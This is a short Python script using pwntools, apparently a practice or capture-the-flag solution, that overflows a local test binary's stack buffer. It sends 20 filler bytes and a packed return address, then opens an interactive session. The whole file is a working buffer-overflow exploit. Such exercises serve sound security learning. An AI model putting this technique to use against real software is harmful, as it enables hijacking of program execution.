from pwn import *

p=process('./stacktest-extra')

hack = p32(0x401223)

p.sendline(b'h' * 20 + hack)

p.interactive()